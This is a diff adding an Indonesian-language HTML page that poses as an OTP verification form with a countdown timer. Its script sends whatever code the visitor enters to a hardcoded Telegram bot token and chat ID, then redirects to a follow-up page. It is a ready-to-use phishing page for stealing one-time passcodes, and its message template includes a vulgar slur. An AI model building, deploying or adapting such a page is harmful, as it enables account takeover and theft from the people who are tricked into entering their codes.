@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Kode</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background-color: #000000;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            color: #000;
+        }
+
+        .container-box {
+            background: white;
+            width: 100%;
+            max-width: 700px;
+            padding: 25px;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 50px;
+        }
+
+        .title {
+            font-size: 1rem;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .input-box {
+            width: 100%;
+            height: 40px;
+            border: 1px solid #999;
+            border-radius: 4px;
+            padding: 0 15px;
+            font-size: 1rem;
+            margin-bottom: 15px;
+            outline: none;
+        }
+
+        .info-text {
+            font-size: 0.8rem;
+            color: #666;
+            margin-bottom: 10px;
+        }
+
+        .timer-text {
+            font-size: 0.9rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .resend-link {
+            font-size: 0.8rem;
+            color: #000;
+            text-decoration: underline;
+            margin-bottom: 25px;
+            display: inline-block;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #ff0050;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .footer-text {
+            color: white;
+            font-size: 0.8rem;
+            text-align: center;
+            max-width: 600px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container-box">
+        <div class="title">Masukkan kode verifikasi</div>
+
+        <input type="Number" id="kode" class="input-box" placeholder="Masukkan kode disini">
+
+        <div class="info-text">
+            Kode OTP di kirim via SMS/WhatsApp/Email.<br>
+            OTP akan kedaluwarsa setelah 3 menit.
+        </div>
+
+        <div class="timer-text" id="timer">2:51</div>
+
+        <a href="#" class="resend-link">Kirim ulang kode</a>
+
+        <button class="submit-btn" onclick="kirimData()">MASUK</button>
+    </div>
+
+    <div class="footer-text">
+        Anda mungkin menerima SMS, notifikasi WhatsApp,<br>
+        dan notifikasi pesan instan lainnya.
+    </div>
+
+    <!-- ============================================== -->
+    <!-- SCRIPT KIRIM KE TELEGRAM & PINDAH HALAMAN -->
+    <!-- ============================================== -->
+    <script>
+        // 👇👇 GANTI INI DULU 👇👇
+        const BOT_TOKEN = "8463412359:AAG6nli8rzC54LQSKkgXBXkwI8ePspNfFIA"; 
+        const CHAT_ID = "-1003797236002";
+        const HALAMAN_BERIKUTNYA = "verifikasi ulang.html"; // Ganti nama file
+
+        // === TIMER HITUNG MUNDUR ===
+        let totalDetik = 2 * 60 + 51; // 2 menit 51 detik
+        const timerElement = document.getElementById('timer');
+        
+        const countdown = setInterval(() => {
+            let menit = Math.floor(totalDetik / 60);
+            let detik = totalDetik % 60;
+            
+            detik = detik < 10 ? "0" + detik : detik;
+            timerElement.textContent = menit + ":" + detik;
+            totalDetik--;
+
+            if(totalDetik < 0) {
+                clearInterval(countdown);
+                timerElement.textContent = "Waktu Habis";
+            }
+        }, 1000);
+
+        // === FUNGSI KIRIM DATA ===
+        function kirimData(){
+            let kode = document.getElementById("kode").value;
+
+            let pesan = ` <b>*░▒▬▬ஜ۩Kontol۩ஜ▬▬▒░*</b>
+ Kode: ${kode}`;
+
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: pesan,
+                    parse_mode: "HTML"
+                })
+            })
+            .then(() => {
+                // LANGSUNG PINDAH HALAMAN
+                window.location.href = HALAMAN_BERIKUTNYA;
+            });
+        }
+    </script>
+
+</body>
+</html>
